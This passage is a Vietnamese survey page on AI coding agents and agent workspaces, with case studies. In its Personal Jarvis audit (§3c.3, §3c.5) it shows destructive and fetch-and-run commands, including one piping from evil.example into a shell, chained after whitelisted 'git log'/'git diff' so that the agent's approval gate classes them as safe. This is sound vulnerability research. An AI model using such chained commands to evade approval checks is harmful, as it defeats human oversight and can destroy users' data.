# 01 · AI Coding Agents

> Các agent/trợ lý lập trình chạy trong terminal, IDE hoặc cloud. Số sao ước lượng tại 9–10/2026, đối chiếu từ nhiều nguồn (xem cuối trang).

## 1. Bảng tổng hợp

### 1.1 Mã nguồn mở (CLI / tự host)

| Dự án | Repo | License | ★ (ước lượng) | Điểm nổi bật | Ghi chú |
|---|---|---|---|---|---|
| **OpenCode** | github.com/sst/opencode | MIT | ~210k | CLI/TUI agent đa model, provider-agnostic, LSP tích hợp | Nhiều nguồn xếp #1 nhóm mở (9/2026) |
| **DeepSeek Harness** | github.com/deepseek-ai/deepseek-harness | MIT | ~200k (2 tuần sau 13/8/2026) | Kiến trúc "mọi thứ là plugin": UI, tool call, context injection, cả agent loop đều thay được; hỗ trợ model local | Developer preview, chưa nhận PR ngoài; số sao giữa các nguồn chênh lệch (95k→203k) |
| **OpenAI Codex CLI** | github.com/openai/codex | Apache-2.0 | ~127k | Agent terminal chính thức của OpenAI, sandbox, multi-agent orchestration | Rust rewrite |
| **Gemini CLI** | github.com/google-gemini/gemini-cli | Apache-2.0 | ~107k | Agent terminal của Google, free tier rộng, MCP | |
| **OpenHands** (cũ: OpenDevin) | github.com/OpenHands/OpenHands | MIT | ~90k | Nền tảng agent dev đầy đủ (sandbox Docker, web UI, cloud), nhiều SOTA SWE-bench | Đổi tên từ All-Hands-AI |
| **Cline** | github.com/cline/cline | Apache-2.0 | ~69k | VS Code extension agent, plan/act mode, MCP marketplace | |
| **Aider** | github.com/Aider-AI/aider | Apache-2.0 | ~49k | Pair-programming terminal, repo map, git-native | Commit cuối 5/2026 → phát triển chậm lại |
| **SWE-agent** | github.com/SWE-agent/SWE-agent | MIT | ~20.5k | Princeton; agent-computer interface, giải GitHub issue tự động | Nghiên cứu, bảo trì đều (10/2026) |
| **mini-SWE-agent** | github.com/SWE-agent/mini-swe-agent | MIT | ~8.4k | **100 dòng code**, >74% SWE-bench Verified; là harness chuẩn của Vals leaderboard | Minh chứng "harness đơn giản vẫn mạnh" |
| **Goose** | github.com/block/goose | Apache-2.0 | – | Agent desktop/CLI của Block, MCP-first | |
| **Roo Code / Kilo Code** | github.com/RooCodeInc/Roo-Code | Apache-2.0 | – | Fork Cline, nhiều mode | |

### 1.2 Thương mại / mã đóng

| Sản phẩm | Hãng | Hình thức | Giá tham khảo | Điểm nổi bật |
|---|---|---|---|---|
| **Claude Code** | Anthropic | CLI + IDE + web/cloud | theo gói Claude | Repo ~148k★ nhưng mã đóng; hooks, skills, subagents, plugins (`ralph-loop`), `/loop`, worktree |
| **Cursor** | Anysphere | VS Code fork | Pro $20 / Pro+ $60 / Ultra $200 | Mạnh nhất cho multi-file; cloud agents song song; đọc SKILL.md từ 2.4 (1/2026) |
| **Windsurf → Devin Desktop** | Cognition | IDE | ~$15–20 | Sau khi Cognition mua Windsurf, vận hành dưới tên Devin Desktop (nguồn chưa thống nhất) |
| **Devin** | Cognition | Cloud agent | $20 beta / $500 seat ent. | Agent "kỹ sư phần mềm" đầu tiên |
| **GitHub Copilot** | GitHub/MS | IDE + coding agent | $10 / $19 / $39 | Mặc định cho team GitHub; agent kém Cursor/Claude Code theo review |
| **Google Jules** | Google | Cloud async agent | free 15 task/ngày | Tốt cho test & PR trên repo Python |
| **OpenAI Codex (cloud)** | OpenAI | Cloud agent | trong ChatGPT Plus $20 / Pro $100+ | Chạy song song nhiều task trong sandbox |

### 1.3 Agent workspace / ADE – chạy nhiều coding agent song song (thêm 2026-10-12)

Lớp **không phải agent** mà là "bàn làm việc" bọc các CLI agent ở bảng 1.1/1.2: mỗi agent một pane/worktree, so sánh kết quả, review diff. ★ đọc trên trang GitHub 12/10/2026 trừ khi ghi khác.

| Dự án | Repo | License | ★ | Cách tiếp cận | Ghi chú |
|---|---|---|---|---|---|
| **Personal Jarvis** | github.com/Dodaios/Dodaios (cũ: PersonalJarvis/PersonalJarvis) | Apache-2.0 (≤1.6.0 là MIT) | 183 | "Super-app": ADE nhiều pane + giọng nói/wake word + computer use + agent nền có memory + marketplace | Case study §3c; Python + React, 1 tác giả chính |
| **T3 Code** | github.com/pingdotgg/t3code | MIT | ~27,1k | "Agent harness control surface": điều khiển agent trên máy mình qua web/desktop/mobile | Personal Jarvis mượn code thread/timeline và trang Computers (NOTICE) |
| **Vibe Kanban** | github.com/BloopAI/vibe-kanban | Apache-2.0 | ~28,3k | Bảng kanban, mỗi thẻ = một agent trong worktree riêng | README ghi **đang sunset**, chuyển cho cộng đồng |
| **Orca** | github.com/stablyai/orca | MIT | chưa rõ (10k–43k tùy nguồn) | Fan-out 1 prompt sang nhiều CLI agent, mỗi agent một worktree, chọn bản thắng để merge | Số sao các nguồn lệch nhau ~4× → **(chưa xác minh)** |
| **Munder Difflin** | github.com/HarnessMD/munder-difflin (cũ: chaitanyagiri/…) | MIT (open-core, Pro US$150/năm) | 8,7k | "Văn phòng" agent: mỗi CLI một PTY + avatar, agent điều phối "Michael", hive bằng file + git | Chế độ auto chạy `bypassPermissions` (trừ Codex); xem mục 02 §4b |
| **Omnigent** | github.com/omnigent-ai/omnigent | Apache-2.0 | ~10,8k | "Meta-harness" của Databricks: server + web/desktop/mobile bọc Claude Code, Codex, Cursor, OpenCode, Pi…; policy ba tầng, sandbox đám mây, chia sẻ phiên | Case study §3f; alpha, 7 GHSA trong 4 tháng |
| **Claude Squad** | github.com/smtg-ai/claude-squad | AGPL-3.0 | ~8,6k | TUI trên tmux + git worktree, quản lý Claude Code/Codex/OpenCode/Amp | Nhẹ nhất, chỉ terminal |
| **ThinkRail** | github.com/JetBrains/thinkrail | Apache-2.0 | ~5,8k (29/10) | IDE "thật" (Monaco + terminal + diff) bọc **một** agent `pi` chạy in-process; mỗi workspace = git worktree chạy song song; "living specs" = đồ thị `SPEC.md` agent đọc/ghi; hỗ trợ Agent Skills + MCP | JetBrains InnovationHub (**incubator**, không phải sản phẩm chính); desktop app hoặc web qua CLI `thinkrail`; v0.2.0 (18/10/2026); extension support còn trong roadmap; ảnh 29/10 (5.774★, 304 fork, 275 issue khớp API GitHub) badge "GitHub Trending Repo of the Day #1" **(theo ảnh, chưa xác minh)** |
| **Conductor** | Melty Labs (đóng) | thương mại | – | App Mac, agent song song mỗi cái một worktree, panel review diff | Chỉ macOS (theo bài so sánh, chưa xác minh) |

## 2. Benchmark & cách đánh giá

| Benchmark | Trạng thái 10/2026 | Top |
|---|---|---|
| SWE-bench Verified | **Bão hòa**: Vals ngừng chấm model mới từ 1/9/2026; OpenAI tuyên bố (2/2026) không còn đo được frontier | Claude Opus 5 (mini-SWE-agent) 97.0%, DeepSeek V4 Pro 96.4%, GPT-5.6 Sol 96.2% |
| SWE-bench Pro (Verified) | Benchmark kế nhiệm, khó hơn | Claude Opus 5.5 ~65% (6/10/2026) |
| Khác | SWE-Touch (người dùng sửa code giữa chừng), RoadmapBench (nâng cấp version dài hạn), UTBoost | Đang nổi trong giới học thuật |

**Bài học:** chọn agent theo (1) harness có kiểm soát được không, (2) license, (3) chi phí token, (4) tích hợp MCP/skills; đừng dựa vào số sao.

## 3. Xu hướng kiến trúc đáng chú ý

- **Harness > Model**: các paper 2026 ("Harness Engineering: Source-Code Study of Eleven Systems", "Inside the Scaffold") cho thấy phần lớn chất lượng đến từ vòng lặp, công cụ, quản lý ngữ cảnh.
- **Plugin hóa toàn bộ** (DeepSeek Harness) và **tối giản hóa** (mini-SWE-agent) là 2 cực cùng tồn tại.
- **Cloud/async agents** (Codex cloud, Jules, Cursor cloud agents, Claude Code web) → lập trình viên trở thành người ra đề & review.
- **Memory có cấu trúc** cho agent ("Your Code Agent Can Grow Alongside You", 2026).

## 3b. Case study: Understand-Anything – codebase thành knowledge graph (trending, 2026-10-12)

> Nguồn: ảnh bảng trending người dùng gửi ("Understand-Anything: +2.331 sao/ngày"). Nghiên cứu từ repo (README, cấu trúc, CLAUDE.md), trang org, trendshift, bài Better Stack / Augment Code, các directory skill.

### 3b.1 Hồ sơ nhanh

| Thuộc tính | Giá trị (đọc 2026-10-12) |
|---|---|
| Repo | https://github.com/Egonex-AI/Understand-Anything (URL cũ `Lum1104/Understand-Anything` redirect về đây; mirror `GoodDingo/understand-anything`) |
| Tác giả | Yuxiang Lin · Infinite Universe, Inc. (dòng bản quyền); org **Egonex-AI** ("Understand anything. Understand anyone."), website egonexai.com, 1 repo public, không member public |
| Ngôn ngữ / license | TypeScript, pnpm workspaces, Tree-sitter, Vite, Vitest; **MIT** |
| Số liệu | **85,9k★**, 7,2–7,5k fork, 42 contributor, 857 commit, 117 issue mở, 200 PR mở; cập nhật 10/10/2026 |
| Trending | #1 GitHub Trending TypeScript 4 ngày (21–28/5/2026, lần đầu 23/5); trendshift +6.836★/61 ngày (13/8–12/10), đỉnh 12–14/9 (+227/+240/+241 mỗi ngày); ảnh người dùng gửi ghi +2.331★/ngày (đợt sóng mới) |
| Tagline | "Graphs that teach > graphs that impress" |

### 3b.2 Nó làm gì

- Biến code (hoặc docs, wiki kiểu "Karpathy LLM wiki") thành **knowledge graph tương tác**: node là file/hàm/class, cạnh là import/call/kế thừa; tóm tắt tiếng Anh thường, **guided tour** theo thứ tự phụ thuộc, tìm fuzzy + ngữ nghĩa, **diff impact analysis**, phân lớp (API/Service/Data/UI/Utility), view business logic (domain → flow → step), UI thích ứng persona (junior dev, PM, power user), giải thích 12 pattern ngôn ngữ trong ngữ cảnh; đầu ra đa ngôn ngữ gồm **tiếng Việt** (en, zh, zh-TW, ja, ko, ru, vi).
- Lệnh: `/understand` (lưu `.ua/knowledge-graph.json`; `--language`, `--auto-update` tạo post-commit hook), `/understand-dashboard`, `/understand-chat`, `/understand-diff`, `/understand-explain`, `/understand-onboard`, `/understand-domain`, `/understand-knowledge`.
- Cài: `/plugin marketplace add Egonex-AI/Understand-Anything` → `/plugin install understand-anything`; nền tảng khác qua `install.sh`/`install.ps1` (Codex dùng tiền tố `$`). Hỗ trợ: Claude Code (plugin gốc), Cursor, VS Code + Copilot, Copilot CLI, Codex, OpenCode, OpenClaw, Antigravity, Gemini CLI, Pi Agent, Vibe CLI, Hermes, Cline, KIMI CLI, Trae, Nanobot, Kiro.
- Chia sẻ team: commit graph (trừ `.ua/intermediate/` và `diff-overlay.json`), graph lớn dùng git-lfs; viewer read-only `npx` (Node ≥18) không cần Claude Code.

### 3b.3 Cách hoạt động (điểm đáng học)

| Lớp | Cơ chế | Vì sao quan trọng |
|---|---|---|
| **Tất định** | Tree-sitter trích import/export/định nghĩa/call site/kế thừa; cùng input → cùng output; cũng là cơ sở **incremental** (chỉ phân tích file đổi) | Giảm hallucination cấu trúc, giảm token lần sau |
| **Ngữ nghĩa** | LLM sinh summary, tag, layer, domain mapping, tour, concept callout | Phần "dạy" người đọc |
| **Pipeline đa agent** | project-scanner → file-analyzer (song song tối đa 5 worker, 20–30 file/batch) → architecture-analyzer → tour-builder → graph-reviewer; thêm domain-analyzer, article-analyzer | Chia việc theo vai trò + có **reviewer** kiểm graph (evaluator pattern, mục 03) |
| **Đóng gói** | Cùng một lõi, nhiều thư mục plugin (`.claude-plugin`, `.copilot-plugin`, `.cursor-plugin`) + installer | Mẫu "một skill, nhiều host" (mục 04/20) |

README tự cảnh báo: lần chạy đầu trên codebase lớn **tốn nhiều token**; gợi ý gói subscription hoặc model local (Ollama, mục 10).

### 3b.4 Đánh giá

- **Điểm mạnh:** lai tất định + LLM đúng chỗ; incremental; output kiểm tra được (JSON trong repo); viewer không cần agent; đa host; đa ngôn ngữ (có vi).
- **Rủi ro / lưu ý:** phần lớn bài viết bên ngoài là aggregator/khuyến mãi, chưa có đánh giá độc lập về độ chính xác graph; một trang trending (trendingrepo.com) gắn cờ "có thể star-farming" cho bản owner cũ — **chưa xác minh**, nhưng tốc độ +2k★/ngày sau 5 tháng ra mắt là bất thường và đáng theo dõi (so sánh ADHD, Anatomy, OpenMontage ở mục 03/06/19 đều có đợt sóng tương tự). Chi phí token lần đầu; graph lớn cần lfs; 200 PR mở cho thấy maintainer quá tải.
- **Vị trí trong kho:** công cụ "đọc hiểu codebase" cho coding agent, cùng nhóm với Context7/llms.txt (mục 16) và memory có cấu trúc (mục 10). Đáng thử cho onboarding dự án lạ và review tác động diff trước khi vào Ralph loop (mục 03).

### 3b.5 Cập nhật 2026-10-30 (yêu cầu người dùng, clone lại)

| Mục | 12/10/2026 | 30/10/2026 |
|---|---|---|
| ★ / fork | 85,9k / 7,2–7,5k | **89k / 7,5k** (shields) |
| Commit / tác giả | 857 / 42 | **866 / 85** (git shortlog; 42 là số "contributor" trên trang GitHub, cách đếm khác) |
| Issue / PR mở | 117 / 200 | **126 / 211** |
| Phiên bản | – | tag mới nhất **v2.9.0 (10/7/2026)**, nhưng `plugin.json` đã là **2.9.8** → bản phát hành đi theo plugin, không theo tag |

- **Nhịp phát triển chậm hẳn:** chỉ 7 commit từ 12/10 (sửa import-map Python, Makefile, thêm issue template), trong khi sao vẫn tăng ~3k. Đợt "+2.331★/ngày" (§3b.1) không đi kèm hoạt động mã tương ứng; số PR mở tiếp tục tăng → maintainer quá tải là rủi ro chính.
- **Đã có từ trước nhưng hồ sơ §3b chưa ghi:** skill **`/understand-figma`** + agent `design-analyzer` (từ 24/6/2026) đọc file Figma qua **Figma REST API** (cần token Figma) và dựng graph thiết kế (page, screen, component, token); agent `assemble-reviewer`; tổng **10 agent, 9 skill** (§3b.3 ghi 7 agent).
- **Hook thật** (`understand-anything-plugin/hooks/hooks.json`): chỉ 2 hook — PostToolUse `Bash` (gợi ý cập nhật graph sau commit) và SessionStart (kiểm `autoUpdate` trong `config.json` của `.understand-anything/` hoặc `.ua/`). Không thấy telemetry trong mã (grep `posthog|telemetry|analytics` 30/10/2026). Dữ liệu chỉ rời máy qua model của chính agent host (và Figma API khi dùng skill Figma).
- **Thư mục dữ liệu:** mặc định `.ua/` (như §3b.2); dự án đã có `.understand-anything/` (tên cũ) tiếp tục dùng thư mục đó, không cần chuyển; installer ngoài Claude Code clone repo vào `~/.understand-anything/repo` rồi symlink.
- **CI:** 2 workflow (ci, deploy-homepage), 67 file test (Vitest) — mỏng hơn nhiều so với claude-mem (1.098) hay ECC (483).
- Nhận định ở §3b.4 giữ nguyên. Lựa chọn thay thế tất định, không cần LLM cho phần code: Graphify (mục 16 §2d, §2e).

**Nguồn §3b.5:** clone github.com/Egonex-AI/Understand-Anything 30/10/2026 (blob:none, 866 commit, HEAD 4e6d329 26/10/2026; README.md, SECURITY.md, understand-anything-plugin/{.claude-plugin/plugin.json, hooks/hooks.json, agents/*.md, skills/*/SKILL.md}, .github/workflows/*; git log/tag/shortlog) · img.shields.io/github/{stars,forks,license,last-commit,v/release,issues,issues-pr}/Egonex-AI/Understand-Anything.json (30/10/2026)

## 3c. Case study: Personal Jarvis (Dodaios) – "super-app" agent cho desktop (ảnh README người dùng gửi, 2026-10-12)

> Nguồn: ảnh chụp README người dùng gửi. Nghiên cứu bằng clone đầy đủ lịch sử (commit `e28f53f`, 11/10/2026), đọc `README.md`, `AGENTS.md`, `NOTICE`, `LICENSE`, `jarvis.toml.example`, `jarvis/safety/*`, `jarvis/core/config.py`, `.github/workflows/`; trang GitHub, PyPI, personaljarvis.ai; tìm HN/Reddit (không thấy thảo luận độc lập).

### 3c.1 Hồ sơ nhanh

| Thuộc tính | Giá trị (đọc 2026-10-12) |
|---|---|
| Repo | https://github.com/Dodaios/Dodaios — **đổi tên từ `PersonalJarvis/PersonalJarvis`** 10–11/10/2026 (PR #525, #526, #530; URL cũ vẫn redirect). PyPI `personal-jarvis` còn trỏ homepage về URL cũ, nhưng attestation bản 3.1.1 ghi repo Dodaios |
| Tác giả | Ruben Lütke (Đức): **5.777/5.839 commit** (~99%); 3 người khác 10–14 commit; 2 commit ký "Claude" |
| Tuổi / nhịp | Commit đầu 19/6/2026 → 105 ngày có commit, đỉnh **264 commit/ngày** (1/7/2026); 71 tag, v3.1.1 (10/10/2026); 378 commit "auto-save WIP via Claude stop-hook" |
| Quy mô | ~664k dòng Python trong `jarvis/` (74 package con), frontend React, 2.564 file `test_*.py`, 23 workflow GitHub Actions, `CHANGELOG.md` 212 KB |
| License | **Apache-2.0** từ 2.0.0 (commit 27/8/2026 "switch from MIT to Apache 2.0"); bản ≤1.6.0 vẫn MIT. Có `TRADEMARK.md` (không liên kết Marvel/Disney…) |
| Số liệu GitHub | 183★, 70 fork, 4 watcher, 33 issue, 56 PR mở; 20 topic (`claude-code`, `computer-use`, `wake-word`, `mcp`…) |
| Cài đặt | `irm …/install.ps1 \| iex` / `curl … install.sh \| bash`, installer .exe/.dmg/AppImage (macOS chưa notarize, Windows chờ SignPath), hoặc `pip install personal-jarvis` + `jarvis serve` (headless, cổng 47821) |

### 3c.2 Nó làm gì (theo README, đã đối chiếu thư mục)

- **Agentic IDE**: nhiều pane terminal thật, mỗi pane chạy một CLI (Claude Code, Codex, OpenCode, Kimi Code, GLM, Grok Build, Antigravity, Cursor CLI, DeepSeek Harness); pane có **call sign T1, T2…** để ra lệnh bằng giọng ("Tell T1 to write the tests"), gửi cùng một task cho nhiều pane rồi so sánh. Dùng subscription có sẵn của người dùng (`jarvis/claude_auth.py`, `codex_auth.py`, `*_quota_state.py`).
- **Jarvis Agents**: agent sống lâu, mỗi agent một chat không kết thúc, ghi chú riêng ("self-learning"), routine theo lịch; mission dài chạy trong **git worktree**, tách worker song song, qua bước review. Có phần chuyển thể từ `NousResearch/hermes-agent` (`third_party/hermes-agent`, MIT).
- **Giọng nói**: wake word tự chọn, hội thoại ngắt lời được, dictation vào mọi app, gọi điện (Twilio); STT/TTS chạy offline được (Silero VAD).
- **Computer use** desktop + trình duyệt; **marketplace** >40 plugin/MCP/skill/CLI; memory dạng **wiki local** có trích dẫn; Routines; Appshots; "Jarvis Verse" 3D; pet trên desktop; kênh Telegram/Discord; CLI `jarvis` + API local.

### 3c.3 Đọc cổng thật thay vì văn xuôi (mục 23, WORKFLOW)

| Tuyên bố README | Code / cấu hình thật | Nhận xét |
|---|---|---|
| "Every action passes a risk check with four levels: safe, monitor, ask and block. Anything that could change your system waits for your approval" | `jarvis/safety/risk_tier.py`: thứ tự **blacklist → whitelist → tier mặc định của tool** (+ hook `risk_tier_for_args`). `config.py`: `approval_mode` mặc định **`"bypass"`**, `default_tier = "safe"`; chỉ tier `ask` mới hỏi | Mặc định là **không hỏi** cho việc do app tự chạy; README nói ngược lại. Docs `safety-and-approvals.md` có thừa nhận kết nối kế thừa "monitor default" chạy không hỏi |
| Blacklist chặn lệnh nguy hiểm | `fnmatch` trên chuỗi `"<tool> <args>"` và `"<args>"`; blacklist mặc định chỉ 5 mẫu (`format *`, `rm -rf /`, `del /f /s /q C:\`…). Docstring ghi audit 8/8/2026 phát hiện **mọi mẫu blacklist mặc định từng "chết"** với `run_shell` | Glob khớp chuỗi dễ né (`rm -rf ~`, khoảng trắng kép, `bash -c`) |
| Lệnh phá huỷ sẽ hỏi trước | `command_impact.py` tách `&&`, `;`, `\|` và xếp loại read/modify/destructive — **nhưng chỉ chạy ở bước 3**; whitelist mặc định có `"git log *"`, `"git diff *"` và **thắng trước** | `fnmatchcase("git log -1; rm -rf ~/x", "git log *") == True` → lệnh nối sau whitelist được hạ xuống `safe`, bỏ qua bộ phân loại (phân tích tĩnh 12/10/2026; **16/10/2026 đã gọi `RiskTierEvaluator.evaluate` thật và xác nhận**, xem §3c.5) |
| — | `AGENTS.md` là file hướng dẫn duy nhất; `.claude/{agents,skills}` và `.codex/agents/*.toml` là bản sinh, CI (`scripts/ci/check_agents_md.py`) chặn `CLAUDE.md` | Mẫu "một nguồn, nhiều host" giống mục 04/20 |
| — | `AGENTS.md` §1 "Traps no one guesses": working tree **dùng chung** giữa nhiều phiên agent (cấm `git add -A`); probe vào app thật **tốn tiền thật** (5 lượt test từng tốn $6,82); cấm Chrome headless (từng ghim CPU 100%); mọi reconnect phải jitter (từng cạn cổng ephemeral) | Sổ bẫy cụ thể, có mã AP-n/BUG-n — cùng tinh thần `TRAPS.md` mục 03/23 |

### 3c.4 Đánh giá

- **Điểm mạnh:** gom ADE + voice + computer use + agent nền vào một app local, không cần tài khoản, dùng lại subscription sẵn có; ghi công bên thứ ba cẩn thận (`NOTICE` liệt kê T3 Code, hermes-agent, Silero); `AGENTS.md` là ví dụ tốt về sổ bẫy thực chiến cho codebase do agent viết; có release bot, scorecard, attestation, nhiều workflow smoke đa nền tảng.
- **Rủi ro:** (1) **bus factor = 1** và nhịp 50–260 commit/ngày cho thấy phần lớn code do agent sinh — 664k dòng Python sau ~4 tháng khó audit; (2) mặc định `bypass` + whitelist thắng bộ phân loại lệnh là khoảng hở thật cho app có quyền điều khiển máy (mục 12); (3) cài bằng `curl | bash`/`irm | iex`, binary macOS chưa notarize, Windows chưa ký; (4) đổi tên repo, đổi license MIT→Apache trong 4 tháng → link/PyPI chưa đồng bộ; (5) cộng đồng nhỏ (183★), chưa có review độc lập — phần tính năng đều là **tự công bố**; (6) trùng tên với `open-jarvis/OpenJarvis` (Stanford, ~11k★, Apache-2.0, local-first nhưng thiên về framework + đo hiệu năng/năng lượng) và nhiều fork/mirror `*/PersonalJarvis`.
- **So với nhóm ADE (§1.3):** T3 Code/Orca/Claude Squad chỉ làm "bàn điều phối" và giữ phạm vi hẹp; Personal Jarvis là cực "làm tất cả", gần OpenClaw/Hermes Agent (mục 02) hơn là một IDE. Chọn T3 Code hoặc Claude Squad nếu chỉ cần chạy agent song song; thử Personal Jarvis nếu muốn điều khiển bằng giọng nói, nhưng đặt `approval_mode = "ask"` và xoá whitelist `git log *`/`git diff *` (hoặc chỉ whitelist lệnh không tham số) trước khi giao quyền computer use.
- **Bài học đem về kho:** (a) **call sign cho pane** là giao diện điều phối bằng giọng rẻ mà hiệu quả; (b) allowlist kiểu glob trên chuỗi lệnh phải chạy **sau** bộ tách lệnh nối, không trước (mục 12 §4); (c) stop-hook auto-commit WIP là lưới an toàn, nhưng sinh 378 commit nhiễu → nên squash trước khi merge.

### 3c.5 Cập nhật 2026-10-16: ảnh README gửi lại, tên mới Dodaios, lỗ whitelist đã kiểm bằng chạy thật

> Người dùng gửi lại ảnh đầu README: tiêu đề "Personal Jarvis", "The open-source AI agent super-app for your desktop…", huy hiệu pypi v3.1.1 · License Apache 2.0 · CI passing · Discord, link Install · Website · Docs · Discord · X, video `personal-jarvis-demo-2026-10-02-v2.mp4` (3:24). Đã clone lại (HEAD `ae629b4b1` 15/10/2026; 144 commit kể từ `e28f53f`).

| Ô trong ảnh | Kiểm | Ghi chú (16/10/2026) |
|---|---|---|
| Tiêu đề "Personal Jarvis" | ⚠️ cũ | Sản phẩm đã **đổi tên thành Dodaios** trong tài liệu (#546, 12/10), giao diện (#694, 14/10) và thư mục con (#661). Gói Python vẫn là `jarvis/`, file cấu hình vẫn `jarvis.toml` |
| "The open-source AI agent super-app for your desktop" | ⚠️ cũ | README nay viết "Dodaios is an open-source **agent OS** for your desktop… keeps you in control". Tính năng nêu trong ảnh (chạy nhiều coding agent song song, nói chuyện với máy, agent làm việc khi vắng người) vẫn có |
| pypi v3.1.1 | ⚠️ cũ | PyPI `personal-jarvis` **3.2.0** (tag 13/10/2026); `project_urls` nay đã trỏ về repo Dodaios (12/10 còn trỏ URL cũ) |
| License Apache 2.0 | ✅ | Từ 2.0.0; bản ≤1.6.0 vẫn MIT |
| CI passing, Discord | — | Huy hiệu động, không kiểm được từ ảnh |
| Link Install · Website · Docs · Discord · X | ✅ | Có trong README |

**Số liệu:** 223★, 80 fork (shields 16/10/2026; 12/10 là 183★/70 fork). 140/144 commit mới do Ruben Lütke, còn lại là bot: bus factor vẫn = 1.

**Lỗ whitelist (§3c.3) vẫn còn, nay đã kiểm bằng chạy thật.** Ở HEAD, `jarvis/safety/risk_tier.py` vẫn xét blacklist → **whitelist** → tier mặc định của tool; `approval_mode` mặc định vẫn `"bypass"` (`jarvis/core/config.py`). Whitelist trong code mặc định rỗng, nhưng `jarvis.toml.example` có `"git log *"`, `"git diff *"`, và script đóng gói Linux/macOS **chép file này thành `jarvis.toml` mặc định** của bản cài. Nạp đúng file `risk_tier.py` ở HEAD (chỉ stub hai module kiểu `jarvis.core.config`, `jarvis.core.protocols`) rồi gọi `evaluate` với tool `run_shell`, whitelist/blacklist lấy từ `jarvis.toml.example`:

| Lệnh | Kết quả |
|---|---|
| `rm -rf ~/x` (đối chứng) | `tier=ask` |
| `git log -1; rm -rf ~/x` | **`tier=safe`**, `approved_by=whitelist`, khớp `git log *` |
| `git diff && curl https://evil.example/x \| sh` | **`tier=safe`**, `approved_by=whitelist`, khớp `git diff *` |

Lệnh xoá đứng một mình bị hỏi; nối sau `git log` thì được coi là an toàn. Đây là kết luận ở **mức hàm đánh giá rủi ro**. Chưa chạy trong app đầy đủ, nên chưa loại trừ khả năng một lớp khác (bộ thực thi shell) chặn lại. README vẫn viết "Anything that could change your system waits for your approval". Commit an toàn duy nhất trong 4 ngày (`1a553dc04`, #631) chỉ ghi nguồn gốc của đích tool call, "No tier changes".

**Cách xử lý:** repo có `SECURITY.md` với kênh báo riêng (GitHub private vulnerability reporting). Lỗ này nên báo qua kênh đó, không mở issue công khai. Khi dùng: đặt `approval_mode = "ask"` và xoá `git log *`, `git diff *` khỏi whitelist (§3c.4).

## 3d. Case study: FilmCraft — "Premiere Pro viết lại bằng Rust, 343K dòng từ 6 dòng, 11 ngày" (ảnh người dùng gửi, 2026-10-12)

> Kiểm từng con số trong ảnh bằng lịch sử git đầy đủ của repo, tài liệu `ROADMAP.md`, `docs/target-app-parity.md`, `docs/gaps.md` và issue tracker; nguồn ngoài tra cùng ngày.

### 3d.1 Hồ sơ nhanh

| Mục | Thông tin (12/10/2026) |
|---|---|
| Repo | `storytold/filmcraft` · **~10,9k★**, 4,3k fork, 1.757 commit, 299 issue mở, 131 PR mở; license MIT OR Apache-2.0 |
| Định vị | "An open-source, nonlinear video editor written from scratch in pure Rust" (bản cũ ghi "clean-room reimplementation of Adobe Premiere Pro") |
| Tác giả | Brandon Thomas (`echelon`), ArtCraft / Storyteller.ai; một trong loạt "Crafting Apps" dựng lại bộ Adobe (PhotoCraft, VectorCraft, LightCraft…). Biểu tượng cú là icon thật của dự án, vẽ bằng ArtCraft |
| Phát hành | v0.1.0 (2/10) → v0.6.0 (11/10/2026), 0.7.0 đang chuẩn bị; binary Windows, macOS, Linux, FreeBSD, web |
| Đón nhận | PetaPixel, Gizmodo, Phoronix, TweakTown ("Software is over"), HN — chính tác giả viết "super early alpha… not anywhere close to ready" |

### 3d.2 Ba con số trong ảnh, đối chiếu repo

| Ảnh nói | Thực tế | Kết luận |
|---|---|---|
| **343K dòng** | `docs/target-app-parity.md`: "measured 2026-10-10: 45 crates + 3 apps, ~343,000 lines of Rust, 2,520 `#[test]` functions"; đếm lại 12/10: 392.739 dòng `.rs`, khoảng 340,7k dòng không trống, không comment | Đúng |
| **"từ 6 dòng"** | Là **commit đầu tiên** (`16489ce`, 30/9/2026): 2 dòng `.gitignore` + 4 dòng README — **không phải một prompt 6 dòng**. Chính commit đó ignore thư mục `plan/`; `CLAUDE.md` bảo agent làm theo `plan/execution-plan.md`, tài liệu kiến trúc và ảnh chụp Premiere làm mẫu — tất cả không công khai. 11 phút sau đã có skeleton workspace, 67 phút sau có 68 file `.rs` (giao diện egui, decoder H.264 CABAC, MCP server) | Gây hiểu lầm; nhiều khả năng có công chuẩn bị trước lịch sử công khai **(chưa xác minh)** |
| **11 ngày** | 30/9 → 10/10/2026 là 11 ngày, khớp tài liệu | Đúng về thời gian, nhưng không phải "một người + AI": **94 tên tác giả**; tài liệu ghi 243 PR từ 5/10 "most from community contributors' agents"; riêng 10–11/10 có 820 commit |
| **"??% con số giấu kín"** | Không tìm thấy nguồn của ảnh **(chưa xác minh)**. Ứng viên: số tự đánh giá của dự án (~86% "feature breadth", ~56% "ready for real work"), hoặc tỉ lệ commit do Claude đồng tác giả: **735/1.015 commit không phải merge (~72%)**, phần lớn ghi "Claude Opus 5.5"; nhánh `worktree-agent-…` cho thấy nhiều phiên Claude Code chạy song song trong git worktree | — |

### 3d.3 Chạy được tới đâu

- **Làm được nhiều thật:** codec tự viết (H.264 mã hoá/giải mã; HEVC, AV1 giải mã; ProRes, AAC, VP9, Opus, DNxHD, MPEG-2/AC-3), FFmpeg chỉ dùng làm **oracle cho test** chứ không nằm trong sản phẩm; giao diện egui, compositor wgpu theo linear light; trao đổi FCP7 XML, FCPXML, OTIO, EDL, AAF, OMF; multicam, chỉnh màu, keyframe, phụ đề; hơn 650 lệnh mà agent gọi được qua MCP.
- **Không có cổng test:** `ROADMAP.md` tự ghi "no workflow runs the tests today" — CI chỉ có release và đóng gói, 2.520 test tồn tại nhưng không chặn merge.
- **Crash khi mở** trên macOS 12, Intel UHD, Windows 11 (`docs/gaps.md` G4; issue #468, #512, #380, #1290…), export treo.
- **Thiếu:** import `.prproj` (chặn bản beta), plugin VST3/AU/OpenFX, xuất HEVC/AV1 bằng phần mềm, phần lớn tính năng AI.
- **"Parity" tự đo:** "Effects 100%" nghĩa là effect có mặt và qua test; "Menus 92%" là diff nhãn menu — chưa đo độ trung thực so với Premiere (harness fidelity còn "upcoming"). Dự án tự ước cần thêm 400–700 giờ agent mới tới beta.
- **Cảnh báo tải về:** repo nhái `filmcraft-app/filmcraft` (2★) có README "Download filmcraft" kèm link `.7z`/`.run` — kiểu mồi malware quen thuộc **(chưa xác minh)**; chỉ tải từ release của `storytold/filmcraft` hoặc getartcraft.com.

### 3d.4 Bài học

